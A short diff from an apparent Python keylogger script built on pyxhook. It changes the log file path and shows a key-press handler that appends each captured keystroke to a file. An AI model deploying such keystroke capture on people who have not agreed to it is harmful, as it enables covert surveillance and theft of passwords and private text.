@@ -1,5 +1,5 @@
 import pyxhook
-log_file='path should be change according to user directory'
+log_file='path abcd'
 def OnKeyPress(event):
   fob=open(log_file,'a')
   fob.write(event.Key)
